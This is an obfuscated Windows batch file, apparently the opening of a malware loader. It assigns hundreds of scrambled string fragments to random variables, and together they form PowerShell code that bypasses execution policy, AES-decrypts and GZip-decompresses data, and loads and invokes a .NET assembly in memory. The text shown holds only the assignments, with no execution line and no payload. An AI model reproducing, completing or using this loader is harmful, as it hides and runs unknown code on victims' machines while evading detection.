@echo off
set "pnqSvUleCH=py"
set "EzlkbYxXzO= C"
set "PFtnNgojfy=ll"
set "yimUmJeQYO=nd"
set "LSHnoyYHgF=em"
set "iGpscsQzzB=32"
set "vNaMWzBxmw=he"
set "YNCWMXjlUY=:\"
set "WKqbRocisy=xe"
set "cbZPqBKtfy=ow"
set "KZjENGByBF=s\"
set "UGWlbdcYFn=po"
set "LUYmYPEVyj=Po"
set "ipbaNzZyEo=co"
set "MKlAqPBIKc=Sy"
set "KXmjXgaFLq=y "
set "JbVXGbVoHK= /"
set "GoCuRZhrHD=rs"
set "UYYNJwmNMY=Wi"
set "TsnfVSZiwh=st"
set "czJVhJjEIX=ws"
set "HsbtUTcXlS=in"
set "kkydJfxgRH=0\"
set "IivTnkmckb=ll"
set "GpNvaGeBuc=.e"
set "nSafRhJgmk=rS"
set "pSnGKfAEir=we"
set "QUCeUndUdD=do"
set "jFvqJTUSuR=\v"
set "acJdFrMeJU=\W"
set "gxInzRDYAP=1."
set "bdVoYkzhtw=we"
set "JyoogVVpge=he"
set "JQDgFJqmmg=cd"
set "WMdOSTNKad= %~dp0"
set "RPQjqqmhtp=();$"
set "EyNyZyMupo=.Dis"
set "BEUXXGqiWY=-nop"
set "wGxpQoybYX=);$c"
set "ubpxqCimuQ=se()"
set "gPPDoLcamy=k; }"
set "LInBOiZNuw= = $"
set "FjdvOrEjWf=)($D"
set "aZufEaOspG=-ep "
set "HVEUDTaFHd=$nlm"
set "GJKuVTUYcO=3); "
set "ZQsLBJKJIB=bnjM"
set "ksTThkjGZe=-1.."
set "TFUAcPpUdS=y]::"
set "VynZEcZeWY=p) {"
set "JuloiVuLEL=..-1"
set "tnvImQXToT=ke($"
set "joVCsivMWK=Conv"
set "XnXfdKbCxj=.Mem"
set "RpyIemzvxl=lCeN"
set "dtxQzvKULd=trea"
set "XWehIltcak=.Sec"
set "VbFNDHoeFC=ment"
set "tEbKYZMNFA=ew-O"
set "IEQLTpoRnP=Secu"
set "xpUnZOSnNI=rity"
set "TClZfLuDAM=bjec"
set "zBqOmkzQtp=esFX"
set "cZhTdZkJzo=Star"
set "iIoeuVdzLC=ddin"
set "GHqgUfLlnU=xCbY"
set "SinNoDdpXk=join"
set "mEaZWymvGw=Iy.T"
set "ydpzLbGlpE=pStr"
set "YLMcZanBrm=);$n"
set "YrPmlBhROd=.Cry"
set "ttggNfniNa=FiS "
set "GMDrffDBBb=oL'["
set "mCCMfwOMgI=rity"
set "EcnADrGsXN=OyzA"
set "CUXtocFOJG=pDZz"
set "bAQXvwzFOf=New-"
set "ynPmyNESrX=.Len"
set "mzbecrTaRL===')"
set "sBsxEswkyt=[IO."
set "BCebXdMjeq=Obje"
set "qrbpVdWJIZ=6esa"
set "TOACuSqZOD=$fxM"
set "PULtYrZlQv=]::N"
set "jGfvUoIzzl='dqR"
set "GSymmbhJUX=[Env"
set "NycnaCnRgl=form"
set "mNscHnmbFI=n ''"
set "MQsltYQfzd=eRbA"
set "hMoDQTsgue=SseN"
set "alICJhjRLC='')("
set "CmQCIjSuql=gnir"
set "pomstQUhfj=bB ="
set "DgTGpkWcnS=V = "
set "LWcdtcociZ=Mp ="
set "eiFBgNaEZk=lBlo"
set "CSkFnLfYlW=raph"
set "MmkfbQcQAU=::('"
set "suZJArXbfJ=bnjM"
set "riRBlaOMpY=($Ss"
set "OjwFKBVhII=ptog"
set "EtmJhHHzhO=..-1"
set "DjhCWVGjje=;$lC"
set "aqUIhxdfxW==');"
set "ecTNfpLdNp=6] -"
set "BHXJOMIdti='gni"
set "JolwzNJZHa=fxMb"
set "QPpXSLtXSm= '')"
set "YmEHbkKqaP=)($f"
set "vMCFzKTTyg= = $"
set "hDdBKLcFTI=;$Jn"
set "uUFQUvsKJJ=)))"
set "sNLPGKqqPc=ionM"
set "cZJivwPGww=pher"
set "DSknJSsUAn=7;$c"
set "BaQnqbddSj=in $"
set "maFFAWSIoA=flec"
set "dGMRHVsctj=;$Bd"
set "UBAtviZgdu=n ''"
set "hGFNnnucic=bY.D"
set "PcjLtLFmbk=rtS4"
set "lyUhpNYcgT=0O+g"
set "TNecguHJmK=tem."
set "KPCRlgTNxx=ptor"
set "HwBugVIZFZ= = ["
set "THEsHHsbzx=Fina"
set "jCQJoddAMv=TllA"
set "TuyEWRvJBV=.GZi"
set "ZhQtljOIJq=$nlm"
set "nmOXJUntqn=th('"
set "XjBzJXxRzM=oint"
set "MmcOBaFmLy=yste"
set "xaeeZPkjjj=  $D"
set "QfnbDnMAeM=)) {"
set "UImIqQyhzD=ecry"
set "BQLuqBTvFJ=sGUc"
set "xEfLtIPmRl=raph"
set "BmXwsbvWQh=Iy);"
set "quJaCDwmGA=V = "
set "YXsRKppTuQ=.Dis"
set "AoOUYajGIY= New"
set "ItpcHLtCKi=le  "
set "CvjyVAMXbM=.-16"
set "mqvTESFoUr=isfL"
set "twpRTwEgsx=sx.T"
set "mBDBrBgHGj=('%*'"
set "NderihiYtI=fore"
set "GBbjyWavcq=File"
set "BrMBinxkqB=ress"
set "vDNAjqoktI=embl"
set "TWfUDxgIFm=tS46"
set "HtNOgeiupU=eNV."
set "eXFdQEPgFI=bB);"
set "vdmJjiJoOg=.Con"
set "xqbfpGmbiv=Stre"
set "iGkcSRdZGd=);$J"
set "QegbTUqgfW=.Ass"
set "TOfxTrOZkx=-joi"
set "EsCWZqBHxD=lit("
set "qNBpPwQnNP=NV, "
set "soOkgfgkZA=Mode"
set "pmdbfjsVEs=em.C"
set "BISVMtVNRM=, $f"
set "nNyNXUVVIM=comm"
set "YOJyDzpWKR=m(, "
set "ufjEArcCOj=KDFi"
set "uNJyPHpjtv=daeR"
set "gNSSIusApW=:('g"
set "FwcnrpIbHc=-4] "
set "xTgwufOuqE=rans"
set "BGdxlVFlLJ=gMod"
set "guEqvYDMcK=oArr"
set "YuTKgOgNBw=736u"
set "nyPvzBlFur=[-1."
set "aZmlKRgzcT=tem."
set "AgMyQYMIbt=sion"
set "xWHhXNXFfi=; };"
set "RuKRKfqiwK=Disp"
set "BsgCbjgTja=]::("
set "zzLRBUtbRq=ck($"
set "nBoTIVDjif=and "
set "bBLoZEaJPL== $c"
set "oharLopoFO=UGTu"
set "kSniBGneRz=);$c"
set "vRUgLPKefo=ring"
set "OmMPCxRheQ=ect "
set "OSmpRrRLwM=e]::"
set "wjFSdjnhsr=]::C"
set "UTycjZuWzY=('l0"
set "SQzVrYbXlU=vert"
set "PBYogDkVEC=eam("
set "FUXgHXTcWS=bnjM"
set "zwrLiXGLtp=y.Pa"
set "NhEagoCZsB=O.Me"
set "gMBVdToPCS=am;$"
set "pptlVxyToU=$cbn"
set "cbIVvJOTcT=m.IO"
set "vbzuwMGLNE=tsWi"
set "tyLUBYKxMq=null"
set "hsNTeizIoE=();$"
set "grFvrjsxMJ=m.Re"
set "SJijNtqwdK=[Sys"
set "NHNkmbwbRH=();$"
set "dbOSdMndmm=vj0m"
set "uOWzYizqSQ=lmIy"
set "ZSMtVzAZsj=y.Ci"
set "bbaxlmQdTm=saBm"
set "PlkxRaAarh= '')"
set "YWliuBkeSg=Syst"
set "CrDFgDDgHO=hy.A"
set "aiZKGgqeGi=em.I"
set "UqbnNcUEzy=rofi"
set "aTQJhLtWuk=Syst"
set "lVBxgNaAkw== [S"
set "tpaSNTtQel=M.Pa"
set "rBqEiywilT=ach "
set "RTrzIPXfFA=yTo("
set "IoGvwRfbqe=bnjM"
set "dITsUIoXYD=B = "
set "QNQfUCSAXX=bypa"
set "QwPNcaCPuz=ing("
set "nwZHmXjknO=Invo"
set "fElbhoFdNo=morF"
set "txfERoeIaI=::De"
set "IehXZumKLu=($Ss"
set "TyuhrLxcko=pres"
set "bZesEuPIMC=stem"
set "xNXJupJbFf=[Sys"
set "YdPCADUvfR=$fxM"
set "BvGwxTIZQh=ert]"
set "HzfZLVFsum=Comp"
set "aIVCGVTFDF=onve"
set "giUQrHnUHX= if "
set "bnJEnPhpBD='[-1"
set "mMyXBgwajB=[]] "
set "HFBmxqRXqR=S46e"
set "cKIIixSclG=fsx "
set "NKQVEDmFXK=oin "
set "JYvgKohrUh=rt]:"
set "EfJlsuiMPZ=stem"
set "ieAQWJVgsN=kCkM"
set "TSFMYYPxqw=$kCk"
set "LEaHjmAiVw=ode]"
set "IrbLrzDmCa=tion"
set "OcwULuwEtM=Disp"
set "caAnRCwDyC=ptog"
set "NAIpnbTavs=esMa"
set "ScUrlxYnRh=join"
set "XgUwVpNVUu=7Yiv"
set "JircRRmwqq=-Obj"
set "kkqWbcfWbE=ddin"
set "fyFlbrylAF=.IO."
set "FZyeMtKjae=PBR."
set "jCyWezZPkA=$lCe"
set "xfeLwXqONd=ose("
set "RqmEKkQxly=Secu"
set "cwkpzDjcjQ=BC;$"
set "VkOtynniKq=PKCS"
set "QHFPYIGjpB=Obje"
set "NEcfVinyXF= = N"
set "ZfprGxCblG=ct S"
set "EURYKkFINL=1..-"
set "bTssarNhZw=iron"
set "xBTzEATgRa=xMbB"
set "fxkIshEvap=+hAO"
set "NWiOjIkbsM=ion."
set "QUMDrzqYSl= [Sy"
set "CMepEgSPum=1] -"
